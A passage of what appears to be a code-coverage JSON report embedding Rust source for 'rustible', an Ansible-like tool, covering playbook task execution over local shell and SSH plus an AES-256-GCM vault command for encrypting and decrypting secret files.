Check when condition (simplified)\n            if let Some(when) = when_condition {\n                let condition = when.as_str().unwrap_or(\"true\");\n                if condition == \"false\" {\n                    ctx.output.task_result(\n                        host,\n                        TaskStatus::Skipped,\n                        Some(\"conditional check failed\"),\n                    );\n                    stats.lock().await.record(host, TaskStatus::Skipped);\n                    continue;\n                }\n            }\n\n            // Determine the module being used\n            let (module, _args) = self.detect_module(task);\n\n            // In check mode, don't actually execute\n            if ctx.check_mode {\n                ctx.output.task_result(\n                    host,\n                    TaskStatus::Changed,\n                    Some(\u0026format!(\"[check mode] would run: {}\", module)),\n                );\n                stats.lock().await.record(host, TaskStatus::Changed);\n                continue;\n            }\n\n            // Execute the task (simplified)\n            let result = self.execute_module(ctx, host, task, vars).await;\n\n            match result {\n                Ok(changed) =\u003e {\n                    let status = if changed {\n                        TaskStatus::Changed\n                    } else {\n                        TaskStatus::Ok\n                    };\n                    ctx.output.task_result(host, status, None);\n                    stats.lock().await.record(host, status);\n                }\n                Err(e) =\u003e {\n                    // Check for ignore_errors\n                    let ignore_errors = task\n                        .get(\"ignore_errors\")\n                        .and_then(|v| v.as_bool())\n                        .unwrap_or(false);\n\n                    if ignore_errors {\n                        ctx.output.task_result(\n                            host,\n                            TaskStatus::Ignored,\n                            Some(\u0026format!(\"ignored error: {}\", e)),\n                        );\n                        stats.lock().await.record(host, TaskStatus::Ignored);\n                    } else {\n                        ctx.output\n                            .task_result(host, TaskStatus::Failed, Some(\u0026e.to_string()));\n                        stats.lock().await.record(host, TaskStatus::Failed);\n                    }\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Check if a task should run based on tags\n    fn should_run_task(\u0026self, task: \u0026serde_yaml::Value) -\u003e bool {\n        // If no tags specified, run everything\n        if self.tags.is_empty() \u0026\u0026 self.skip_tags.is_empty() {\n            return true;\n        }\n\n        let task_tags: Vec\u003cString\u003e = task\n            .get(\"tags\")\n            .and_then(|t| {\n                if let Some(s) = t.as_str() {\n                    Some(vec![s.to_string()])\n                } else if let Some(seq) = t.as_sequence() {\n                    Some(\n                        seq.iter()\n                            .filter_map(|v| v.as_str().map(String::from))\n                            .collect(),\n                    )\n                } else {\n                    None\n                }\n            })\n            .unwrap_or_default();\n\n        // Check skip_tags first\n        for skip_tag in \u0026self.skip_tags {\n            if task_tags.contains(skip_tag) {\n                return false;\n            }\n        }\n\n        // Check tags\n        if !self.tags.is_empty() {\n            for tag in \u0026self.tags {\n                if task_tags.contains(tag) || tag == \"all\" {\n                    return true;\n                }\n            }\n            return false;\n        }\n\n        true\n    }\n\n    /// Detect which module a task is using\n    fn detect_module\u003c'a\u003e(\n        \u0026self,\n        task: \u0026'a serde_yaml::Value,\n    ) -\u003e (\u0026'static str, Option\u003c\u0026'a serde_yaml::Value\u003e) {\n        // Common modules to check for\n        let modules = [\n            \"command\",\n            \"shell\",\n            \"copy\",\n            \"file\",\n            \"template\",\n            \"package\",\n            \"apt\",\n            \"yum\",\n            \"dnf\",\n            \"pip\",\n            \"service\",\n            \"systemd\",\n            \"user\",\n            \"group\",\n            \"git\",\n            \"debug\",\n            \"set_fact\",\n            \"include_tasks\",\n            \"import_tasks\",\n            \"block\",\n        ];\n\n        for module in modules {\n            if let Some(args) = task.get(module) {\n                return (module, Some(args));\n            }\n        }\n\n        (\"unknown\", None)\n    }\n\n    /// Execute a module (simplified implementation)\n    async fn execute_module(\n        \u0026self,\n        ctx: \u0026CommandContext,\n        host: \u0026str,\n        task: \u0026serde_yaml::Value,\n        vars: \u0026IndexMap\u003cString, serde_yaml::Value\u003e,\n    ) -\u003e Result\u003cbool\u003e {\n        let (module, args) = self.detect_module(task);\n\n        ctx.output\n            .debug(\u0026format!(\"Executing module '{}' on host '{}'\", module, host));\n\n        // Handle debug module locally\n        if module == \"debug\" {\n            if let Some(args) = args {\n                if let Some(msg) = args.get(\"msg\").and_then(|m| m.as_str()) {\n                    let templated_msg = Self::template_string(msg, vars);\n                    ctx.output.info(\u0026format!(\"DEBUG: {}\", templated_msg));\n                }\n                if let Some(var) = args.get(\"var\").and_then(|v| v.as_str()) {\n                    // Look up the variable value\n                    let var_name = Self::template_string(var, vars);\n                    if let Some(value) = vars.get(\u0026var_name) {\n                        ctx.output\n                            .info(\u0026format!(\"DEBUG: {} = {:?}\", var_name, value));\n                    } else {\n                        ctx.output\n                            .info(\u0026format!(\"DEBUG: {} = \u003cundefined\u003e\", var_name));\n                    }\n                }\n            }\n            return Ok(false);\n        }\n\n        // Handle set_fact locally (no remote execution needed)\n        if module == \"set_fact\" {\n            return Ok(true);\n        }\n\n        // For command/shell modules, execute remotely if not localhost\n        if module == \"command\" || module == \"shell\" {\n            let cmd = if let Some(args) = args {\n                args.as_str()\n                    .map(|s| s.to_string())\n                    .or_else(|| {\n                        args.get(\"cmd\")\n                            .and_then(|c| c.as_str())\n                            .map(|s| s.to_string())\n                    })\n                    .unwrap_or_default()\n            } else {\n                String::new()\n            };\n\n            if cmd.is_empty() {\n                return Err(anyhow::anyhow!(\"No command specified\"));\n            }\n\n            if host == \"localhost\" || host == \"127.0.0.1\" {\n                // Local execution\n                ctx.output.debug(\u0026format!(\"Local execution: {}\", cmd));\n                let parts: Vec\u003c\u0026str\u003e = cmd.split_whitespace().collect();\n                if parts.is_empty() {\n                    return Err(anyhow::anyhow!(\"Empty command\"));\n                }\n\n                let output =\n                    std::process::Command::new(if module == \"shell\" { \"sh\" } else { parts[0] })\n                        .args(if module == \"shell\" {\n                            vec![\"-c\", \u0026cmd]\n                        } else {\n                            parts[1..].to_vec()\n                        })\n                        .output()\n                        .map_err(|e| anyhow::anyhow!(\"Failed to execute command: {}\", e))?;\n\n                if output.status.success() {\n                    return Ok(true);\n                } else {\n                    let stderr = String::from_utf8_lossy(\u0026output.stderr);\n                    return Err(anyhow::anyhow!(\"Command failed: {}\", stderr));\n                }\n            } else {\n                // Remote execution via SSH\n                return self.execute_remote_command(ctx, host, \u0026cmd).await;\n            }\n        }\n\n        // For other modules, simulate execution for now\n        Ok(true)\n    }\n\n    /// Execute a command on a remote host via SSH\n    /// Uses connection pooling to reuse connections across multiple commands\n    async fn execute_remote_command(\n        \u0026self,\n        ctx: \u0026CommandContext,\n        host: \u0026str,\n        cmd: \u0026str,\n    ) -\u003e Result\u003cbool\u003e {\n        // Get host connection details from inventory\n        let (ansible_host, ansible_user, ansible_port, ansible_key) =\n            self.get_host_connection_info(ctx, host)?;\n\n        // Get or create a pooled connection\n        let conn = ctx\n            .get_connection(\n                host,\n                \u0026ansible_host,\n                \u0026ansible_user,\n                ansible_port,\n                ansible_key.as_deref(),\n            )\n            .await?;\n\n        // Execute command on the pooled connection\n        let result = conn\n            .execute(cmd, None)\n            .await\n            .map_err(|e| anyhow::anyhow!(\"Command execution failed: {}\", e))?;\n\n        if result.success {\n            Ok(true)\n        } else {\n            Err(anyhow::anyhow!(\n                \"Command failed with exit code {}: {}\",\n                result.exit_code,\n                if result.stderr.is_empty() {\n                    result.stdout\n                } else {\n                    result.stderr\n                }\n            ))\n        }\n    }\n\n    /// Get connection info for a host from inventory\n    fn get_host_connection_info(\n        \u0026self,\n        ctx: \u0026CommandContext,\n        host: \u0026str,\n    ) -\u003e Result\u003c(String, String, u16, Option\u003cString\u003e)\u003e {\n        // Try to load from inventory\n        if let Some(inv_path) = ctx.inventory() {\n            if inv_path.exists() {\n                let content = std::fs::read_to_string(inv_path)?;\n                let inventory: serde_yaml::Value = serde_yaml::from_str(\u0026content)?;\n\n                // Look for host-specific vars\n                if let Some(all) = inventory.get(\"all\") {\n                    // Get global vars\n                    let global_user = all\n                        .get(\"vars\")\n                        .and_then(|v| v.get(\"ansible_user\"))\n                        .and_then(|u| u.as_str())\n                        .map(|s| s.to_string());\n                    let global_key = all\n                        .get(\"vars\")\n                        .and_then(|v| v.get(\"ansible_ssh_private_key_file\"))\n                        .and_then(|k| k.as_str())\n                        .map(|s| s.to_string());\n\n                    // Get host-specific vars\n                    if let Some(hosts) = all.get(\"hosts\") {\n                        if let Some(host_config) = hosts.get(host) {\n                            let ansible_host = host_config\n                                .get(\"ansible_host\")\n                                .and_then(|h| h.as_str())\n                                .map(|s| s.to_string())\n                                .unwrap_or_else(|| host.to_string());\n                            let ansible_user = host_config\n                                .get(\"ansible_user\")\n                                .and_then(|u| u.as_str())\n                                .map(|s| s.to_string())\n                                .or(global_user)\n                                .unwrap_or_else(|| {\n                                    std::env::var(\"USER\").unwrap_or_else(|_| \"root\".to_string())\n                                });\n                            let ansible_port = host_config\n                                .get(\"ansible_port\")\n                                .and_then(|p| p.as_u64())\n                                .unwrap_or(22)\n                                as u16;\n                            let ansible_key = host_config\n                                .get(\"ansible_ssh_private_key_file\")\n                                .and_then(|k| k.as_str())\n                                .map(|s| s.to_string())\n                                .or(global_key);\n\n                            return Ok((ansible_host, ansible_user, ansible_port, ansible_key));\n                        }\n                    }\n                }\n            }\n        }\n\n        // Default: use host as-is with current user\n        let user = self\n            .user\n            .clone()\n            .unwrap_or_else(|| std::env::var(\"USER\").unwrap_or_else(|_| \"root\".to_string()));\n        let key = self\n            .private_key\n            .as_ref()\n            .map(|p| p.to_string_lossy().to_string());\n\n        Ok((host.to_string(), user, 22, key))\n    }\n\n    /// Validate a limit pattern\n    /// Returns an error message if the pattern is invalid\n    fn validate_limit_pattern(limit: \u0026str) -\u003e std::result::Result\u003c(), String\u003e {\n        // Check for limit from file (@filename)\n        if let Some(file_path) = limit.strip_prefix('@') {\n            let path = std::path::Path::new(file_path);\n            if !path.exists() {\n                return Err(format!(\"Limit file not found: {}\", file_path));\n            }\n            return Ok(());\n        }\n\n        // Split by colon to check each part\n        for part in limit.split(':') {\n            let part = part.trim();\n            if part.is_empty() {\n                continue;\n            }\n\n            // Strip leading operators (!, \u0026)\n            let pattern = part.trim_start_matches('!').trim_start_matches('\u0026');\n\n            // Check for regex pattern\n            if let Some(regex_str) = pattern.strip_prefix('~') {\n                if regex::Regex::new(regex_str).is_err() {\n                    return Err(format!(\"Invalid regex pattern in limit: {}\", regex_str));\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Template a string by replacing {{ variable }} patterns with values\n    fn template_string(template: \u0026str, vars: \u0026IndexMap\u003cString, serde_yaml::Value\u003e) -\u003e String {\n        // Simple Jinja2-like templating for {{ variable }} syntax\n        let re = Regex::new(r\"\\{\\{\\s*([^}]+?)\\s*\\}\\}\").unwrap();\n        let mut result = template.to_string();\n\n        for cap in re.captures_iter(template) {\n            let full_match = cap.get(0).unwrap().as_str();\n            let expr = cap.get(1).unwrap().as_str().trim();\n\n            // Handle simple variable lookup (no filters for now)\n            let var_name = expr.split('|').next().unwrap_or(expr).trim();\n\n            if let Some(value) = vars.get(var_name) {\n                let replacement = Self::yaml_value_to_string(value);\n                result = result.replace(full_match, \u0026replacement);\n            }\n            // If variable not found, leave the original template expression\n        }\n\n        result\n    }\n\n    /// Convert a YAML value to a display string\n    fn yaml_value_to_string(value: \u0026serde_yaml::Value) -\u003e String {\n        match value {\n            serde_yaml::Value::Null =\u003e String::new(),\n            serde_yaml::Value::Bool(b) =\u003e b.to_string(),\n            serde_yaml::Value::Number(n) =\u003e n.to_string(),\n            serde_yaml::Value::String(s) =\u003e s.clone(),\n            serde_yaml::Value::Sequence(seq) =\u003e {\n                let items: Vec\u003cString\u003e = seq.iter().map(Self::yaml_value_to_string).collect();\n                format!(\"[{}]\", items.join(\", \"))\n            }\n            serde_yaml::Value::Mapping(map) =\u003e {\n                let items: Vec\u003cString\u003e = map\n                    .iter()\n                    .map(|(k, v)| {\n                        format!(\n                            \"{}: {}\",\n                            Self::yaml_value_to_string(k),\n                            Self::yaml_value_to_string(v)\n                        )\n                    })\n                    .collect();\n                format!(\"{{{}}}\", items.join(\", \"))\n            }\n            serde_yaml::Value::Tagged(tagged) =\u003e Self::yaml_value_to_string(\u0026tagged.value),\n        }\n    }\n}\n\n#[async_trait::async_trait]\nimpl Runnable for RunArgs {\n    async fn run(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        self.execute(ctx).await\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_run_args_parsing() {\n        let args = RunArgs::try_parse_from([\"run\", \"playbook.yml\"]).unwrap();\n        assert_eq!(args.playbook, PathBuf::from(\"playbook.yml\"));\n    }\n\n    #[test]\n    fn test_run_args_with_tags() {\n        let args = RunArgs::try_parse_from([\n            \"run\",\n            \"playbook.yml\",\n            \"--tags\",\n            \"install\",\n            \"--tags\",\n            \"configure\",\n        ])\n        .unwrap();\n        assert_eq!(args.tags, vec![\"install\", \"configure\"]);\n    }\n\n    #[test]\n    fn test_run_args_become() {\n        let args =\n            RunArgs::try_parse_from([\"run\", \"playbook.yml\", \"--become\", \"--become-user\", \"admin\"])\n                .unwrap();\n        assert!(args.r#become);\n        assert_eq!(args.become_user, \"admin\");\n    }\n}\n","traces":[{"line":431,"address":[],"length":0,"stats":{"Line":0}},{"line":432,"address":[],"length":0,"stats":{"Line":0}},{"line":433,"address":[],"length":0,"stats":{"Line":0}},{"line":434,"address":[],"length":0,"stats":{"Line":0}},{"line":435,"address":[],"length":0,"stats":{"Line":0}},{"line":436,"address":[],"length":0,"stats":{"Line":0}},{"line":437,"address":[],"length":0,"stats":{"Line":0}},{"line":438,"address":[],"length":0,"stats":{"Line":0}},{"line":439,"address":[],"length":0,"stats":{"Line":0}},{"line":440,"address":[],"length":0,"stats":{"Line":0}},{"line":441,"address":[],"length":0,"stats":{"Line":0}},{"line":442,"address":[],"length":0,"stats":{"Line":0}},{"line":443,"address":[],"length":0,"stats":{"Line":0}},{"line":444,"address":[],"length":0,"stats":{"Line":0}},{"line":445,"address":[],"length":0,"stats":{"Line":0}},{"line":446,"address":[],"length":0,"stats":{"Line":0}},{"line":447,"address":[],"length":0,"stats":{"Line":0}},{"line":448,"address":[],"length":0,"stats":{"Line":0}},{"line":449,"address":[],"length":0,"stats":{"Line":0}},{"line":450,"address":[],"length":0,"stats":{"Line":0}},{"line":451,"address":[],"length":0,"stats":{"Line":0}},{"line":454,"address":[],"length":0,"stats":{"Line":0}},{"line":455,"address":[],"length":0,"stats":{"Line":0}},{"line":456,"address":[],"length":0,"stats":{"Line":0}},{"line":460,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":25},{"path":["/","home","artur","Repositories","rustible","src","cli","commands","vault.rs"],"content":"//! Vault command - Encrypt/decrypt secrets\n//!\n//! This module implements the `vault` subcommand for managing encrypted secrets.\n\nuse super::{CommandContext, Runnable};\nuse aes_gcm::{\n    aead::{Aead, KeyInit},\n    Aes256Gcm, Nonce,\n};\nuse anyhow::{bail, Context, Result};\nuse argon2::password_hash::SaltString;\nuse argon2::{Argon2, PasswordHasher};\nuse base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};\nuse clap::{Parser, Subcommand};\nuse rand::rngs::OsRng;\nuse rand::RngCore;\nuse std::fs;\nuse std::io::{self, Write};\nuse std::path::PathBuf;\n\n/// Vault header marker\nconst VAULT_HEADER: \u0026str = \"$RUSTIBLE_VAULT;1.0;AES256-GCM\";\n\n/// Arguments for the vault command\n#[derive(Parser, Debug, Clone)]\npub struct VaultArgs {\n    #[command(subcommand)]\n    pub action: VaultAction,\n}\n\n/// Vault subcommands\n#[derive(Subcommand, Debug, Clone)]\npub enum VaultAction {\n    /// Encrypt a file\n    Encrypt(EncryptArgs),\n\n    /// Decrypt a file\n    Decrypt(DecryptArgs),\n\n    /// Edit an encrypted file\n    Edit(EditArgs),\n\n    /// View an encrypted file\n    View(ViewArgs),\n\n    /// Create a new encrypted file\n    Create(CreateArgs),\n\n    /// Re-encrypt with a new password\n    Rekey(RekeyArgs),\n\n    /// Encrypt a string\n    EncryptString(EncryptStringArgs),\n\n    /// Decrypt a string\n    DecryptString(DecryptStringArgs),\n}\n\n/// Arguments for encrypt action\n#[derive(Parser, Debug, Clone)]\npub struct EncryptArgs {\n    /// File to encrypt\n    pub file: PathBuf,\n\n    /// Output file (default: overwrite input)\n    #[arg(short, long)]\n    pub output: Option\u003cPathBuf\u003e,\n\n    /// Vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n\n    /// Vault ID for multi-vault setups\n    #[arg(long)]\n    pub vault_id: Option\u003cString\u003e,\n}\n\n/// Arguments for decrypt action\n#[derive(Parser, Debug, Clone)]\npub struct DecryptArgs {\n    /// File to decrypt\n    pub file: PathBuf,\n\n    /// Output file (default: overwrite input)\n    #[arg(short, long)]\n    pub output: Option\u003cPathBuf\u003e,\n\n    /// Vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n}\n\n/// Arguments for edit action\n#[derive(Parser, Debug, Clone)]\npub struct EditArgs {\n    /// File to edit\n    pub file: PathBuf,\n\n    /// Vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n\n    /// Editor to use\n    #[arg(long, env = \"EDITOR\", default_value = \"vi\")]\n    pub editor: String,\n}\n\n/// Arguments for view action\n#[derive(Parser, Debug, Clone)]\npub struct ViewArgs {\n    /// File to view\n    pub file: PathBuf,\n\n    /// Vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n}\n\n/// Arguments for create action\n#[derive(Parser, Debug, Clone)]\npub struct CreateArgs {\n    /// File to create\n    pub file: PathBuf,\n\n    /// Vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n\n    /// Editor to use\n    #[arg(long, env = \"EDITOR\", default_value = \"vi\")]\n    pub editor: String,\n}\n\n/// Arguments for rekey action\n#[derive(Parser, Debug, Clone)]\npub struct RekeyArgs {\n    /// Files to rekey\n    #[arg(required = true)]\n    pub files: Vec\u003cPathBuf\u003e,\n\n    /// Current vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n\n    /// New vault password file\n    #[arg(long)]\n    pub new_vault_password_file: Option\u003cPathBuf\u003e,\n}\n\n/// Arguments for encrypt-string action\n#[derive(Parser, Debug, Clone)]\npub struct EncryptStringArgs {\n    /// String to encrypt\n    #[arg(short = 'p', long = \"stdin-name\")]\n    pub name: Option\u003cString\u003e,\n\n    /// Vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n\n    /// The string to encrypt (if not provided, reads from stdin)\n    pub string: Option\u003cString\u003e,\n}\n\n/// Arguments for decrypt-string action\n#[derive(Parser, Debug, Clone)]\npub struct DecryptStringArgs {\n    /// The encrypted string to decrypt\n    pub string: String,\n\n    /// Vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n}\n\n/// Vault encryption/decryption engine\npub struct VaultEngine {\n    password: String,\n}\n\nimpl VaultEngine {\n    /// Create a new vault engine with the given password\n    pub fn new(password: String) -\u003e Self {\n        Self { password }\n    }\n\n    /// Derive an encryption key from the password\n    fn derive_key(\u0026self, salt: \u0026[u8]) -\u003e Result\u003c[u8; 32]\u003e {\n        let salt_string = SaltString::encode_b64(salt)\n            .map_err(|e| anyhow::anyhow!(\"Failed to encode salt: {}\", e))?;\n\n        let argon2 = Argon2::default();\n        let hash = argon2\n            .hash_password(self.password.as_bytes(), \u0026salt_string)\n            .map_err(|e| anyhow::anyhow!(\"Failed to derive key: {}\", e))?;\n\n        let hash_bytes = hash.hash.ok_or_else(|| anyhow::anyhow!(\"No hash output\"))?;\n        let mut key = [0u8; 32];\n        key.copy_from_slice(\u0026hash_bytes.as_bytes()[..32]);\n\n        Ok(key)\n    }\n\n    /// Encrypt data\n    pub fn encrypt(\u0026self, plaintext: \u0026[u8]) -\u003e Result\u003cString\u003e {\n        // Generate random salt and nonce\n        let mut salt = [0u8; 16];\n        let mut nonce_bytes = [0u8; 12];\n        OsRng.fill_bytes(\u0026mut salt);\n        OsRng.fill_bytes(\u0026mut nonce_bytes);\n\n        // Derive key\n        let key = self.derive_key(\u0026salt)?;\n\n        // Create cipher\n        let cipher = Aes256Gcm::new_from_slice(\u0026key)\n            .map_err(|e| anyhow::anyhow!(\"Failed to create cipher: {}\", e))?;\n\n        let nonce = Nonce::from_slice(\u0026nonce_bytes);\n\n        // Encrypt\n        let ciphertext = cipher\n            .encrypt(nonce, plaintext)\n            .map_err(|e| anyhow::anyhow!(\"Encryption failed: {}\", e))?;\n\n        // Combine salt + nonce + ciphertext\n        let mut combined = Vec::new();\n        combined.extend_from_slice(\u0026salt);\n        combined.extend_from_slice(\u0026nonce_bytes);\n        combined.extend_from_slice(\u0026ciphertext);\n\n        // Encode as base64\n        let encoded = BASE64.encode(\u0026combined);\n\n        // Format as vault file\n        let mut output = String::new();\n        output.push_str(VAULT_HEADER);\n        output.push('\\n');\n\n        // Split into 80-character lines\n        for chunk in encoded.as_bytes().chunks(80) {\n            output.push_str(std::str::from_utf8(chunk)?);\n            output.push('\\n');\n        }\n\n        Ok(output)\n    }\n\n    /// Decrypt data\n    pub fn decrypt(\u0026self, vault_content: \u0026str) -\u003e Result\u003cVec\u003cu8\u003e\u003e {\n        let lines: Vec\u003c\u0026str\u003e = vault_content.lines().collect();\n\n        // Verify header\n        if lines.is_empty() || !lines[0].starts_with(\"$RUSTIBLE_VAULT\") {\n            bail!(\"Invalid vault file format\");\n        }\n\n        // Parse header\n        let _header = lines[0];\n\n        // Combine remaining lines and decode\n        let encoded: String = lines[1..].iter().map(|l| l.trim()).collect();\n        let combined = BASE64\n            .decode(\u0026encoded)\n            .context(\"Failed to decode vault content\")?;\n\n        // Extract salt, nonce, and ciphertext\n        if combined.len() \u003c 28 {\n            bail!(\"Invalid vault content: too short\");\n        }\n\n        let salt = \u0026combined[0..16];\n        let nonce_bytes = \u0026combined[16..28];\n        let ciphertext = \u0026combined[28..];\n\n        // Derive key\n        let key = self.derive_key(salt)?;\n\n        // Create cipher\n        let cipher = Aes256Gcm::new_from_slice(\u0026key)\n            .map_err(|e| anyhow::anyhow!(\"Failed to create cipher: {}\", e))?;\n\n        let nonce = Nonce::from_slice(nonce_bytes);\n\n        // Decrypt\n        let plaintext = cipher\n            .decrypt(nonce, ciphertext)\n            .map_err(|_| anyhow::anyhow!(\"Decryption failed - wrong password?\"))?;\n\n        Ok(plaintext)\n    }\n\n    /// Check if content is encrypted\n    pub fn is_encrypted(content: \u0026str) -\u003e bool {\n        content.trim_start().starts_with(\"$RUSTIBLE_VAULT\")\n    }\n}\n\n/// Get password from file or prompt\nfn get_password(password_file: Option\u003c\u0026PathBuf\u003e, ctx: \u0026CommandContext) -\u003e Result\u003cString\u003e {\n    if let Some(file) = password_file {\n        let password = fs::read_to_string(file)\n            .with_context(|| format!(\"Failed to read password file: {}\", file.display()))?;\n        return Ok(password.trim().to_string());\n    }\n\n    // Check environment variable\n    if let Ok(password) = std::env::var(\"RUSTIBLE_VAULT_PASSWORD\") {\n        return Ok(password);\n    }\n\n    // Check for password file in environment\n    if let Some(file) = crate::cli::env::vault_password_file() {\n        let password = fs::read_to_string(\u0026file)\n            .with_context(|| format!(\"Failed to read password file: {}\", file.display()))?;\n        return Ok(password.trim().to_string());\n    }\n\n    // Prompt for password\n    ctx.output.flush();\n    print!(\"Vault password: \");\n    io::stdout().flush()?;\n\n    let password = dialoguer::Password::new()\n        .with_prompt(\"Vault password\")\n        .interact()?;\n\n    Ok(password)\n}\n\n/// Get password with confirmation\nfn get_password_with_confirm(\n    password_file: Option\u003c\u0026PathBuf\u003e,\n    ctx: \u0026CommandContext,\n) -\u003e Result\u003cString\u003e {\n    if password_file.is_some() {\n        return get_password(password_file, ctx);\n    }\n\n    ctx.output.flush();\n\n    let password = dialoguer::Password::new()\n        .with_prompt(\"New Vault password\")\n        .with_confirmation(\"Confirm Vault password\", \"Passwords do not match\")\n        .interact()?;\n\n    Ok(password)\n}\n\nimpl VaultArgs {\n    /// Execute the vault command\n    pub async fn execute(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        match \u0026self.action {\n            VaultAction::Encrypt(args) =\u003e {\n                let password = get_password_with_confirm(args.vault_password_file.as_ref(), ctx)?;\n                let engine = VaultEngine::new(password);\n\n                let content = fs::read(\u0026args.file)\n                    .with_context(|| format!(\"Failed to read file: {}\", args.file.display()))?;\n\n                if VaultEngine::is_encrypted(\u0026String::from_utf8_lossy(\u0026content)) {\n                    ctx.output.warning(\"File is already encrypted\");\n                    return Ok(0);\n                }\n\n                let encrypted = engine.encrypt(\u0026content)?;\n\n                let output_path = args.output.as_ref().unwrap_or(\u0026args.file);\n                fs::write(output_path, \u0026encrypted)\n                    .with_context(|| format!(\"Failed to write file: {}\", output_path.display()))?;\n\n                ctx.output\n                    .info(\u0026format!(\"Encryption successful: {}\", output_path.display()));\n                Ok(0)\n            }\n\n            VaultAction::Decrypt(args) =\u003e {\n                let password = get_password(args.vault_password_file.as_ref(), ctx)?;\n                let engine = VaultEngine::new(password);\n\n                let content = fs::read_to_string(\u0026args.file)\n                    .with_context(|| format!(\"Failed to read file: {}\", args.file.display()))?;\n\n                if !VaultEngine::is_encrypted(\u0026content) {\n                    ctx.output.warning(\"File is not encrypted\");\n                    return Ok(0);\n                }\n\n                let decrypted = engine.decrypt(\u0026content)?;\n\n                let output_path = args.output.as_ref().unwrap_or(\u0026args.file);\n                fs::write(output_path, \u0026decrypted)\n                    .with_context(|| format!(\"Failed to write file: {}\", output_path.display()))?;\n\n                ctx.output\n                    .info(\u0026format!(\"Decryption successful: {}\", output_path.display()));\n                Ok(0)\n            }\n\n            VaultAction::View(args) =\u003e {\n                let password = get_password(args.vault_password_file.as_ref(), ctx)?;\n                let engine = VaultEngine::new(password);\n\n                let content = fs::read_to_string(\u0026args.file)\n                    .with_context(|| format!(\"Failed to read file: {}\", args.file.display()))?;\n\n                if !VaultEngine::is_encrypted(\u0026content) {\n                    // Not encrypted, just show content\n                    println!(\"{}\", content);\n                    return Ok(0);\n                }\n\n                let decrypted = engine.decrypt(\u0026content)?;\n                println!(\"{}\", String::from_utf8_lossy(\u0026decrypted));\n                Ok(0)\n            }\n\n            VaultAction::Edit(args) =\u003e {\n                let password = get_password(args.vault_password_file.as_ref(), ctx)?;\n                let engine = VaultEngine::new(password.clone());\n\n                let content = fs::read_to_string(\u0026args.file)\n                    .with_context(|| format!(\"Failed to read file: {}\", args.file.display()))?;\n\n                let was_encrypted = VaultEngine::is_encrypted(\u0026content);\n                let plaintext = if was_encrypted {\n                    engine.decrypt(\u0026content)?\n                } else {\n                    content.into_bytes()\n                };\n\n                // Create temporary file\n                let temp_dir = std::env::temp_dir();\n                let temp_file = temp_dir.join(format!(\".rustible_vault_{}\", std::process::id()));\n\n                fs::write(\u0026temp_file, \u0026plaintext)?;\n\n                // Open editor\n                let status = std::process::Command::new(\u0026args.editor)\n                    .arg(\u0026temp_file)\n                    .status()\n                    .with_context(|| format!(\"Failed to open editor: {}\", args.editor))?;\n\n                if !status.success() {\n                    fs::remove_file(\u0026temp_file).ok();\n                    bail!(\"Editor exited with error\");\n                }\n\n                // Read edited content\n                let edited = fs::read(\u0026temp_file)?;\n                fs::remove_file(\u0026temp_file)?;\n\n                // Re-encrypt if it was encrypted\n                if was_encrypted {\n                    let encrypted = engine.encrypt(\u0026edited)?;\n                    fs::write(\u0026args.file, \u0026encrypted)?;\n                } else {\n                    fs::write(\u0026args.file, \u0026edited)?;\n                }\n\n                ctx.output.info(\"File saved successfully\");\n                Ok(0)\n            }\n\n            VaultAction::Create(args) =\u003e {\n                if args.file.exists() {\n                    bail!(\"File already exists: {}\", args.file.display());\n                }\n\n                let password = get_password_with_confirm(args.vault_password_file.as_ref(), ctx)?;\n                let engine = VaultEngine::new(password);\n\n                // Create temporary file\n                let temp_dir = std::env::temp_dir();\n                let temp_file = temp_dir.join(format!(\".rustible_vault_{}\", std::process::id()));\n\n                fs::write(\u0026temp_file, \"\")?;\n\n                // Open editor\n                let status = std::process::Command::new(\u0026args.editor)\n                    .arg(\u0026temp_file)\n                    .status()\n                    .with_context(|| format!(\"Failed to open editor: {}\", args.editor))?;\n\n                if !status.success() {\n                    fs::remove_file(\u0026temp_file).ok();\n                    bail!(\"Editor exited with error\");\n                }\n\n                // Read content\n                let content = fs::read(\u0026temp_file)?;\n                fs::remove_file(\u0026temp_file)?;\n\n                if content.is_empty() {\n                    ctx.output.warning(\"No content entered, file not created\");\n                    return Ok(0);\n                }\n\n                // Encrypt and save\n                let encrypted = engine.encrypt(\u0026content)?;\n                fs::write(\u0026args.file, \u0026encrypted)?;\n\n                ctx.output\n                    .info(\u0026format!(\"Created encrypted file: {}\", args.file.display()));\n                Ok(0)\n            }\n\n            VaultAction::Rekey(args) =\u003e {\n                let old_password = get_password(args.vault_password_file.as_ref(), ctx)?;\n                let new_password =\n                    get_password_with_confirm(args.new_vault_password_file.as_ref(), ctx)?;\n\n                let old_engine = VaultEngine::new(old_password);\n                let new_engine = VaultEngine::new(new_password);\n\n                for file in \u0026args.files {\n                    let content = fs::read_to_string(file)\n                        .with_context(|| format!(\"Failed to read file: {}\", file.display()))?;\n\n                    if !VaultEngine::is_encrypted(\u0026content) {\n                        ctx.output\n                            .warning(\u0026format!(\"Skipping unencrypted file: {}\", file.display()));\n                        continue;\n                    }\n\n                    let decrypted = old_engine.decrypt(\u0026content)?;\n                    let reencrypted = new_engine.encrypt(\u0026decrypted)?;\n\n                    fs::write(file, \u0026reencrypted)\n                        .with_context(|| format!(\"Failed to write file: {}\", file.display()))?;\n\n                    ctx.output.info(\u0026format!(\"Rekeyed: {}\", file.display()));\n                }\n\n                Ok(0)\n            }\n\n            VaultAction::EncryptString(args) =\u003e {\n                let password = get_password_with_confirm(args.vault_password_file.as_ref(), ctx)?;\n                let engine = 